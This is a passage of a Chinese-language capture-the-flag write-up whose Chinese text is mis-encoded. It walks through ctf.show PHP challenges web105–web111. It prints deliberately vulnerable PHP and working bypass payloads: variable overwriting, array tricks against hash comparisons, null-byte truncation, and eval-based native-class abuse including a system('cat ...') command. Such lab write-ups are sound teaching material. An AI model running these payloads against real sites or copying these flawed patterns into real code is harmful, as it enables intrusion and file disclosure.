</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$error</span><span class="o">=</span><span class="s1">&#39;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$suces</span><span class="o">=</span><span class="s1">&#39;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$key</span><span class="o">===</span><span class="s1">&#39;error&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;what are you doing?!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nv">$$key</span><span class="o">=</span><span class="nv">$$value</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$value</span><span class="o">===</span><span class="s1">&#39;flag&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;what are you doing?!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="nv">$$key</span><span class="o">=</span><span class="nv">$$value</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$flag</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nv">$error</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="k">echo</span> <span class="s2">&#34;your are good&#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="k">die</span><span class="p">(</span><span class="nv">$suces</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><ul>
<li>
<p>æœ¬é¢˜è€ƒæŸ¥å˜é‡è¦†ç›–å’Œ<code>die()</code>çš„çŸ¥è¯†</p>
</li>
<li>
<p><code>$$a = $$b</code>å¯ä»¥ç±»ä¼¼äºï¼Œå°†$açš„åœ°å€æŒ‡å‘$b</p>
<p>æ‰€ä»¥æ— è®º$bæ€ä¹ˆæ”¹å˜å€¼ï¼Œ$açš„å€¼éƒ½ä¼šå’Œ$bä¸€æ ·</p>
</li>
<li>
<p><code>die()</code>å‡½æ•°è™½ç„¶ä¼šç»ˆæ­¢ç¨‹åºï¼Œä½†åŒæ—¶ä¹Ÿä¼šè¾“å‡ºæ‹¬å·å†…çš„ç»ˆæ­¢æç¤ºä¿¡æ¯</p>
</li>
</ul>
<p>æ–¹æ³•ä¸€ï¼š</p>
<p>æœ¬é¢˜åˆ©ç”¨å˜é‡è¦†ç›–å’Œ<code>die()</code>å‡½æ•°çš„ç‰¹æ€§</p>
<ol>
<li>å…ˆå¯¹getçš„å†…å®¹è¿›è¡Œè¦†ç›–ï¼Œä¸”ä¸èƒ½è¦†ç›–errorï¼Œæ‰€ä»¥è¦è¦†ç›–sucesï¼Œå³?suces=flagï¼Œæ­¤æ—¶suces=&gt;flagçš„åœ°å€</li>
<li>å†å¯¹postçš„å†…å®¹è¿›è¡Œè¦†ç›–ï¼Œä¸”ä¸èƒ½å°†flagç›´æ¥è¦†ç›–ï¼Œæ‰€ä»¥åªèƒ½error=sucesï¼Œæ­¤æ—¶error=&gt;flagçš„åœ°å€</li>
<li>æ­¤æ—¶æ— è®ºè¿›å…¥å“ªä¸ª<code>die()</code>å‡½æ•°ï¼Œéƒ½å¯ä»¥è¾“å‡º<code>$flag</code>çš„å€¼</li>
</ol>
<p>payload:</p>
<pre tabindex="0"><code>Get: suces=flag
POST: error=suces
</code></pre><p>æ–¹æ³•äºŒï¼š</p>
<pre tabindex="0"><code>Get: ?suces=flag&amp;flag=
</code></pre><p>å…ˆå°†flagçš„å€¼èµ‹ç»™sucesï¼Œå†å°†flagçš„å€¼èµ‹ä¸ºç©ºï¼Œä»è€Œé€šè¿‡åˆ¤æ–­ï¼Œè¾“å‡ºsucesçš„å€¼</p>
<h4 id="web106">web106<a hidden class="anchor" aria-hidden="true" href="#web106">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 22:38:27
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span><span class="o">==</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$v1</span><span class="o">!=</span><span class="nv">$v2</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>æˆ‘ä»¬ä½¿ç”¨æ•°ç»„ç»•è¿‡å³å¯</p>
<pre tabindex="0"><code>v1[]=1
v2[]=0
</code></pre><h4 id="web107">web107<a hidden class="anchor" aria-hidden="true" href="#web107">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 23:24:14
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">       <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$v2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">       <span class="k">if</span><span class="p">(</span><span class="nv">$v2</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">           <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>parse_strå‡½æ•°:å®ƒç”¨äºå°†å­—ç¬¦ä¸²è§£æä¸ºå˜é‡ï¼Œå¦‚æœ str æ˜¯ URL ä¼ é€’å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† arr åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">   <span class="c1">//parse_str()å°†æŸ¥è¯¢çš„å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span>   <span class="nx">parse_str</span><span class="p">(</span><span class="s2">&#34;name=Gopal K Verma&amp;age=45&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">   
</span></span><span class="line"><span class="ln">5</span><span class="cl">   <span class="k">echo</span> <span class="nv">$name</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl">   <span class="k">echo</span> <span class="nv">$age</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>å…¶å®å®é™…ä¸Šå°±æ˜¯md5å¼±æ¯”è¾ƒ</p>
<p>æ–¹æ³•ä¸€ï¼šéšä¾¿ç»™ä¸€ä¸ªå€¼ç»™flagï¼Œå°†MD5è½¬æ¢åçš„å€¼èµ‹ç»™v3</p>
<pre tabindex="0"><code>v3=1
v1=flag=c4ca4238a0b923820dcc509a6f75849b
</code></pre><p>æ–¹æ³•äºŒ:æ•°ç»„ç»•è¿‡</p>
<pre tabindex="0"><code>v3[]=1
v1=&#34;flag[]=1&#34;
</code></pre><h4 id="web108">web108<a hidden class="anchor" aria-hidden="true" href="#web108">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 23:53:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">ereg</span> <span class="p">(</span><span class="s2">&#34;^[a-zA-Z]+$&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span><span class="o">===</span><span class="k">FALSE</span><span class="p">)</span>  <span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="c1">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]))</span><span class="o">==</span><span class="mh">0x36d</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>é¢˜ç›®ç»™å‡ºçš„0x36dä¸º16è¿›åˆ¶æ•°ï¼Œåè¿›åˆ¶ä¸º877ï¼Œéœ€è¦å­—æ¯å¼€å¤´æˆ–ç»“å°¾çš„è¯ä¸º877aï¼Œå› ä¸ºæ˜¯==å¼±æ¯”è¾ƒï¼Œå¯ä»¥ç­‰åŒäº877ï¼Œé€†åºåä¸ºa778,ç›´æ¥è¯»å–ä¸è¡Œï¼Œéœ€è¦åŠ ä¸€ä¸ªæˆªæ–­%00æ¥ç»•è¿‡æ­£åˆ™çš„åˆ¤æ–­ã€‚</p>
<p>payload</p>
<pre tabindex="0"><code>GET:?c=a%00778
</code></pre><h4 id="web109">web109<a hidden class="anchor" aria-hidden="true" href="#web109">#</a></h4>
<p>è€ƒç‚¹:phpåŸç”Ÿç±»åˆ©ç”¨</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-29 22:02:34
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]+/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]+/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo new </span><span class="si">$v1</span><span class="s2">(</span><span class="si">$v2</span><span class="s2">());&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>å…³äºphpåŸç”Ÿç±»çš„åˆ©ç”¨</p>
<p><a href="https://blog.csdn.net/weixin_54902210/article/details/124689580">https://blog.csdn.net/weixin_54902210/article/details/124689580</a></p>
<p>payload:</p>
<pre tabindex="0"><code>v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;) 
or
v1=Reflectionclass&amp;v2=system(&#39;cat fl36dg.txt&#39;)
</code></pre><p>å…¶ä»–çš„åŸç”Ÿç±»ä¹Ÿè¡Œï¼Œæ¯”å¦‚Error</p>
<h4 id="web110">web110<a hidden class="anchor" aria-hidden="true" href="#web110">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-29 22:49:10
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v2&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo new </span><span class="si">$v1</span><span class="s2">(</span><span class="si">$v2</span><span class="s2">());&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>ä¾æ—§æ˜¯å¯¹phpåŸç”Ÿç±»çš„åˆ©ç”¨</p>
<p>ä½†æ˜¯å¢åŠ äº†å¯¹v1å’Œv2çš„è¿‡æ»¤ï¼Œä½†æ˜¯å®ƒæ²¡æœ‰è¿‡æ»¤å­—æ¯ï¼Œè€ƒè™‘ç”¨çº¯å­—æ¯æ„é€ payload</p>
<p>ç±»<code>FilesystemIterator</code>å¯ä»¥ç”¨æ¥éå†ç›®å½•ï¼Œéœ€è¦ä¸€ä¸ªè·¯å¾„å‚æ•°</p>
<p>å‡½æ•°<code>getcwd</code>å¯ä»¥è¿”å›å½“å‰å·¥ä½œè·¯å¾„ä¸”ä¸éœ€è¦å‚æ•°ï¼Œç”±æ­¤å¯ä»¥æ„é€ payload</p>
<pre tabindex="0"><code>https://fded39f6-0eb1-430b-8f4f-42fd69937aed.challenge.ctf.show?v1=FilesystemIterator&amp;v2=getcwd
</code></pre><p><img alt="image-20250105235948415" loading="lazy" src="assets/image-20250105235948415.png"></p>
<p>å¾—åˆ°flagçš„ä½ç½®,ç›´æ¥è®¿é—®å³å¯</p>
<h4 id="web111">web111<a hidden class="anchor" aria-hidden="true" href="#web111">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-30 02:41:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
